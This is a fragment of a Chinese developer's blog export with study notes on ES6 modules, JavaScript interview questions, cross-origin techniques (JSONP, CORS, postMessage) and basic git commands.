<li>ES6语法中引入import和export来导入和导出模块<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 导出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> c  <span class="comment">// 默认导出方式</span></span><br><span class="line"><span class="keyword">export</span> &#123;name, draw, reportArea, reportPerimeter&#125;  <span class="comment">// 导出所有想要导出的模块，使用花括号并用逗号分隔</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入</span></span><br><span class="line"><span class="keyword">import</span> xxx <span class="keyword">from</span> <span class="string">'./app1.js'</span></span><br><span class="line"><span class="keyword">import</span> &#123;name, draw, reportArea, reportPerimeter&#125; <span class="keyword">from</span> <span class="string">'/js-examples/modules/basic-modules/modules/square.mjs'</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="事不过三抽象思维"><a href="#事不过三抽象思维" class="headerlink" title="事不过三抽象思维"></a>事不过三抽象思维</h3><ul>
<li>同样的代码写三遍，就应该抽成一个函数</li>
<li>同样的属性写的三遍，就应该做成共用属性（原型或类）</li>
<li>同样的原型写三遍，就应该用继承<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(options)&#123;</span><br><span class="line">        [<span class="string">'data'</span>,<span class="string">'update'</span>,<span class="string">'create'</span>,<span class="string">'get'</span>].forEach(key)=&gt;&#123;</span><br><span class="line">            <span class="keyword">if</span>(key <span class="keyword">in</span> options)&#123;</span><br><span class="line">                <span class="keyword">this</span>[key] = options[key]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    create()&#123;</span><br><span class="line">        <span class="built_in">console</span> &amp;&amp; <span class="built_in">console</span>.error &amp;&amp; <span class="built_in">console</span>.error(<span class="string">'还没实现 create'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>()&#123;</span><br><span class="line">        <span class="built_in">console</span> &amp;&amp; <span class="built_in">console</span>.error &amp;&amp; <span class="built_in">console</span>.error(<span class="string">'还没实现 delete'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    update()&#123;</span><br><span class="line">        <span class="built_in">console</span> &amp;&amp; <span class="built_in">console</span>.error &amp;&amp; <span class="built_in">console</span>.error(<span class="string">'还没实现 update'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">get</span>()&#123;</span><br><span class="line">        <span class="built_in">console</span> &amp;&amp; <span class="built_in">console</span>.error &amp;&amp; <span class="built_in">console</span>.error(<span class="string">'还没实现 get'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>面试题总结（一）</title>
    <url>/2018/08/27/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>考察了一些基础知识点<br><a id="more"></a><br><img src="https://i.loli.net/2018/08/27/5b83d9d5278e6.jpeg" alt="alt text"><br><img src="https://i.loli.net/2018/08/27/5b83d9e41ca13.jpeg" alt="alt text"><br><img src="https://i.loli.net/2018/08/27/5b83d9ebdfb06.jpeg" alt="alt text"></p>
<p>1、考察内存机制<br><img src="https://i.loli.net/2018/08/27/5b83da81b01aa.jpeg" alt="alt text"><br>实际打印出来type、size都是全局作用域下的值，在内存图中它们是以值的方式存储，而对于format是一个数组，对于引用类型的值，它在内存图中是以地址的方式存储，当你往同一个地址（format数组）push值，就会更新数据，因此打印出来的只有数组发生了更新</p>
<p>2、考察JS单线程的执行机制<br>在前面的一篇博客中有总结过JS的执行机制，这里打印的顺序为：1 -&gt; 3 -&gt; 6 -&gt; 4 -&gt; undefined -&gt; 2<br><img src="https://i.loli.net/2018/08/27/5b83de846d6b2.png" alt="alt text"></p>
<p>当进入这段代码，这是一个宏任务，首先打印1；看到setTimeout属于另一个宏任务，将它放在宏任务对列里；看到Promise是同步任务，执行并打印3；看到then属于微任务，将它放在这段代码（宏任务）下的微任务对列里；随后打印6；此时一轮宏任务执行完毕，看微任务队列有一个任务then，它会打印成功函数4，而失败函数5不会被打印出来；此时再去查看宏任务对列有一个setTimeout函数，执行并打印出2。</p>
<p>3、考察数组去重，可以用<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = [1,2,5,1,4,5,2,4,3]</span><br><span class="line">Array.from(new Set(a))</span><br></pre></td></tr></table></figure></p>
<p>但题目还绕了一个弯，需要用两次reverse()方法使得“重复则保留最后出现的数值”</p>
<p>4、考察正则，当时看到就两眼蒙逼，根本不会写正则</p>
<p>方大大给出的做法：<img src="https://i.loli.net/2018/08/27/5b83e05833b88.jpeg" alt="alt text"></p>
<p>5、用到Promise.all的方法</p>
<p>// Promise.all, 当所有的 Promise 对象都完成后再执行<br><img src="https://i.loli.net/2018/08/27/5b83e09637993.jpeg" alt="alt text"></p>
]]></content>
  </entry>
  <entry>
    <title>跨域的三种方式</title>
    <url>/2018/08/01/%E8%B7%A8%E5%9F%9F%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="什么是同源"><a href="#什么是同源" class="headerlink" title="什么是同源"></a>什么是同源</h2><p>若两个url的<strong>域名 + 协议 + 端口号</strong>都相同，那么称这两个url同源。非同源的客户端脚本在没有明确授权的情况下，不能读写对方资源，在请求数据时，浏览器会在控制台中报一个异常，提示拒绝访问。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://store.company.com/dir/page.html</span><br><span class="line"></span><br><span class="line">同源、不同路径：</span><br><span class="line">http://store.company.com/dir/other.html</span><br><span class="line">http://store.company.com/dir/inner/another.html</span><br><span class="line"></span><br><span class="line">协议不同：</span><br><span class="line">https://store.company.com/secure.html</span><br><span class="line"></span><br><span class="line">域名不同：</span><br><span class="line">http://news.company.com/dir/other.html</span><br><span class="line"></span><br><span class="line">端口不同：</span><br><span class="line">http://store.company.com:81/dir/etc.html</span><br></pre></td></tr></table></figure></p>
<h2 id="什么是跨域"><a href="#什么是跨域" class="headerlink" title="什么是跨域"></a>什么是跨域</h2><p>跨域指不同源之间的资源访问，只要请求的url在域名、协议或端口有不同，那么就属于跨域。跨域限制是浏览器自带的安全机制，只有在浏览器上发生跨域请求时，就会抛出错误。</p>
<h2 id="JSONP（JSON-padding）"><a href="#JSONP（JSON-padding）" class="headerlink" title="JSONP（JSON+padding）"></a>JSONP（JSON+padding）</h2><ul>
<li>使用场景：当前浏览器不支持CORS（一般是IE），需要别的方式实现跨域</li>
<li>JSONP的实现逻辑：通过请求一个js文件（动态添加script标签），这个js文件中有一个回调函数，回调函数中包含了我们需要的数据。回调函数的名字可以是随机生成的一个随机数，前端需要将这个回调函数的名字以callback的参数传回给后台，后台会将这个函数返回并执行</li>
<li>优点：作用是跨域且支持IE浏览器</li>
<li>缺点：不能像ajax那样知道精确的状态（不知道状态码、响应头），只知道请求是成功或失败（因为函数监听的是onload和onerror事件）；另外script标签的src属性只支持GET不支持POST</li>
</ul>
<p>下面是一个模拟的过程：</p>
<p>请求方：frank.com 的前端程序员（浏览器）</p>
<p>响应方：jack.com 的后端程序员（服务器）</p>
<p>1、请求方创建 script 标签，src 指向响应方，同时传一个查询参数 ?callbackName=yyy</p>
<p>2、响应方根据查询参数callbackName，构造形如</p>
<ul>
<li><p>yyy.call(undefined, ‘你要的数据’)</p>
</li>
<li><p>yyy(‘你要的数据’)</p>
</li>
</ul>
<p>这样的响应</p>
<p>3、浏览器接收到响应，就会执行 yyy.call(undefined, ‘你要的数据’)</p>
<p>4、那么请求方就知道了他要的数据</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>HTML 中 script 标签可以加载其他域下的js，比如我们经常引入一个其他域下线上cdn的jQuery<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://api.jirengu.com/weather.php&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>这时候会向天气接口发送请求获取数据，获取数据后做为 js 来执行。 但这里有个问题，数据是 JSON 格式的数据，直接作为 JS 运行的话我如何去得到这个数据来操作呢？</p>
<p>于是我们添加一个callback的参数<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://api.jirengu.com/weather.php?callback=showData&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>这个请求到达后端后，后端会去解析callback这个参数获取到字符串showData，在发送数据做如下处理：</p>
<p>之前后端返回数据是： {“city”: “hangzhou”, “weather”: “晴天”} 现在后端返回数据： showData({“city”: “hangzhou”, “weather”: “晴天”}) 前端script标签在加载数据后会把 showData({“city” “hangzhou”, “weather”: “晴天”})做为 js 来执行，这实际上就是调用showData这个函数，同时参数是 {“city” “hangzhou”, “weather”: “晴天”}。 用户只需要提前在页面定义好showData这个全局函数，在函数内部处理参数即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function showData(ret)&#123;</span><br><span class="line">    console.log(ret);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://api.jirengu.com/weather.php?callback=showData&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="前后端完整示例"><a href="#前后端完整示例" class="headerlink" title="前后端完整示例"></a>前后端完整示例</h3><p>前端代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">button.addEventListener(&apos;click&apos;, (e)=&gt;&#123;</span><br><span class="line">  let script = document.createElement(&apos;script&apos;)</span><br><span class="line">  let functionName = &apos;frank&apos;+ parseInt(Math.random()*10000000 ,10)</span><br><span class="line">  window[functionName] = function()&#123;  // 每次请求之前搞出一个随机的函数</span><br><span class="line">      amount.innerText = amount.innerText- 1</span><br><span class="line">  &#125;</span><br><span class="line">  script.src = &apos;/pay?callback=&apos; + functionName</span><br><span class="line">  document.body.appendChild(script)</span><br><span class="line">  script.onload = function(e)&#123; // 状态码是 200~299 则表示成功</span><br><span class="line">      e.currentTarget.remove()</span><br><span class="line">      delete window[functionName] // 请求完了就干掉这个随机函数</span><br><span class="line">  &#125;</span><br><span class="line">  script.onerror = function(e)&#123; // 状态码大于等于 400 则表示失败</span><br><span class="line">      e.currentTarget.remove()</span><br><span class="line">      delete window[functionName] // 请求完了就干掉这个随机函数</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>后端代码，不用看<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">if (path === &apos;/pay&apos;)&#123;</span><br><span class="line">    let amount = fs.readFileSync(&apos;./db&apos;, &apos;utf8&apos;)</span><br><span class="line">    amount -= 1</span><br><span class="line">    fs.writeFileSync(&apos;./db&apos;, amount)</span><br><span class="line">    let callbackName = query.callback</span><br><span class="line">    response.setHeader(&apos;Content-Type&apos;, &apos;application/javascript&apos;)</span><br><span class="line">    response.write(`</span><br><span class="line">        $&#123;callbackName&#125;.call(undefined, &apos;success&apos;)</span><br><span class="line">    `)</span><br><span class="line">    response.end()</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<h3 id="jQuery的写法"><a href="#jQuery的写法" class="headerlink" title="jQuery的写法"></a>jQuery的写法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(Button).on(&apos;click&apos;, function () &#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: &quot;http://jack.com:8002/pay&quot;,</span><br><span class="line">        dataType: &quot;jsonp&quot;,</span><br><span class="line">        success: function (response) &#123;</span><br><span class="line">            if (response === &apos;success&apos;) &#123;</span><br><span class="line">                // alert(&apos;前端写的代码&apos;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function () &#123;</span><br><span class="line">            alert(&apos;fail&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h2><p>跨源资源分享（Cross-Origin Resource Sharing），是一种ajax跨域请求资源的方式。实现方式很简单，当你使用XMLHttpRequest发送请求时，浏览器发现该请求不符合同源策略，会给该请求加一个请求头：Origin，后台进行一系列处理，如果确定接受请求则在返回结果中加入一个响应头：Access-Control-Allow-Origin; 浏览器判断该相应头中是否包含 Origin 的值，如果有则浏览器会处理响应，我们就可以拿到响应数据，如果不包含浏览器直接驳回，这时我们无法拿到响应数据。所以 CORS 的表象是让你觉得它与同源的 ajax 请求没啥区别，代码完全一样。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">response.setHeader(&apos;Access-Control-Allow-Origin&apos;,&apos;http://jayce.com:8003&apos;)</span><br><span class="line">response.setHeader(&apos;Access-Control-Allow-Origin&apos;,&apos;*&apos;)  // *代表允许所有浏览器访问</span><br></pre></td></tr></table></figure></p>
<h2 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h2><p>作用：用于网页间通讯<br>语法：otherWindow.postMessage(message, targetOrigin);</p>
<ul>
<li><p>otherWindow:指目标窗口，也就是给哪个window发消息，是 window.frames 属性的成员或者由 window.open 方法创建的窗口</p>
</li>
<li><p>message: 是要发送的消息，类型为 String、Object</p>
</li>
<li><p>targetOrigin: 是限定消息接收范围，可以是*（无限制）或者一个URL</p>
</li>
</ul>
<p>例如父窗口 <a href="http://aaa.com" target="_blank" rel="noopener">http://aaa.com</a> 向子窗口 <a href="http://bbb.com" target="_blank" rel="noopener">http://bbb.com</a> 发送消息<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var popup = window.open(&apos;http://bbb.com&apos;, &apos;title&apos;);</span><br><span class="line">popup.postMessage(&apos;Hello World!&apos;, &apos;http://bbb.com&apos;);</span><br></pre></td></tr></table></figure></p>
<p>子窗口向父窗口发送消息也是类似<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.opener.postMessage(&apos;Nice to see you&apos;, &apos;http://aaa.com&apos;);</span><br></pre></td></tr></table></figure></p>
]]></content>
  </entry>
  <entry>
    <title>git操作命令</title>
    <url>/2018/11/26/git%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>基础git操作<br><a id="more"></a></p>
<h2 id="ssh公钥"><a href="#ssh公钥" class="headerlink" title="ssh公钥"></a>ssh公钥</h2><p>查看本机是否有ssh公钥，通常一个主机对应一个密钥<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh</span><br><span class="line">$ ls</span><br></pre></td></tr></table></figure></p>
<p>通常.pub后缀的文件就是公钥</p>
<p>创建ssh公钥<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen</span><br></pre></td></tr></table></figure></p>
<p>查看本机ssh公钥<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure></p>
<h2 id="git-status查看工作区状态"><a href="#git-status查看工作区状态" class="headerlink" title="git status查看工作区状态"></a>git status查看工作区状态</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># git status</span></span><br><span class="line">- 存在未跟踪文件</span><br><span class="line">On branch master</span><br><span class="line">Untracked files:</span><br><span class="line">  (use <span class="string">"git add &lt;file&gt;..."</span> to include <span class="keyword">in</span> what will be committed)</span><br><span class="line"></span><br><span class="line">        README</span><br><span class="line"></span><br><span class="line">nothing added to commit but untracked files present (use <span class="string">"git add"</span> to track)</span><br><span class="line"></span><br><span class="line">- 将未跟踪文件加入跟踪</span><br><span class="line">$ git add README</span><br><span class="line">再次执行$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use <span class="string">"git reset HEAD &lt;file&gt;..."</span> to unstage)</span><br><span class="line"></span><br><span class="line">        new file:   README</span><br><span class="line">此时该文件为暂存状态</span><br><span class="line"></span><br><span class="line">- 存在已修改文件</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged <span class="keyword">for</span> commit:</span><br><span class="line">  (use <span class="string">"git add &lt;file&gt;..."</span> to update what will be committed)</span><br><span class="line">  (use <span class="string">"git checkout -- &lt;file&gt;..."</span> to discard changes <span class="keyword">in</span> working directory)</span><br><span class="line"></span><br><span class="line">        modified:   index.html</span><br><span class="line">说明已跟踪文件内容发生变化，但还未放入暂存区</span><br><span class="line"></span><br><span class="line">- 将已修改文件加入暂存区</span><br><span class="line">$ git add index.htm</span><br><span class="line">再次执行$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use <span class="string">"git reset HEAD &lt;file&gt;..."</span> to unstage)</span><br><span class="line"></span><br><span class="line">        new file:   README</span><br><span class="line">        modified:   index.html</span><br><span class="line">这时存在一个新增文件和一个改动过的文件，它们都已暂存，下次commit会一并提交到仓库</span><br><span class="line"></span><br><span class="line">- 工作目录干净，不存在未跟踪或修改过的文件</span><br><span class="line">On branch master</span><br><span class="line">Your branch is up to date with <span class="string">'origin/master'</span>.</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>
<h2 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从已跟踪文件清单中移除（即暂缓区），然后提交</span></span><br><span class="line">$ git rm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移动文件（前一个文件是要移动的文件，后一个是移动后的文件）</span></span><br><span class="line">$ git mv file_from file_to</span><br><span class="line">这一部相当于运行了下面三步：</span><br><span class="line">$ mv README.txt README</span><br><span class="line">$ git rm README.txt</span><br><span class="line">$ git add README</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看历史提交记录</span></span><br><span class="line">$ git <span class="built_in">log</span> -l 3  // l指list，后跟想要查看的历史记录条目数</span><br></pre></td></tr></table></figure>
<h2 id="撤销上一次的commit"><a href="#撤销上一次的commit" class="headerlink" title="撤销上一次的commit"></a>撤销上一次的commit</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看提交记录，找到上次提交的 commit id</span></span><br><span class="line">$ git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 撤销，使代码恢复到前一次 commit id 对应的版本</span></span><br><span class="line">$ git reset --hard 748f409386c9fb1f4a51f29a45bad6bff24bf284</span><br><span class="line"></span><br><span class="line"><span class="comment"># 撤销，但不对代码修改进行撤销，仍可以通过 git commit 重新提交对本地代码的修改</span></span><br><span class="line">$ git reset 748f409386c9fb1f4a51f29a45bad6bff24bf284</span><br></pre></td></tr></table></figure>
<p><img src="https://wx4.sinaimg.cn/large/9f1d2bbagy1fxmrcy11imj21t01e8all.jpg" alt="image"></p>
]]></content>
  </entry>
</search>
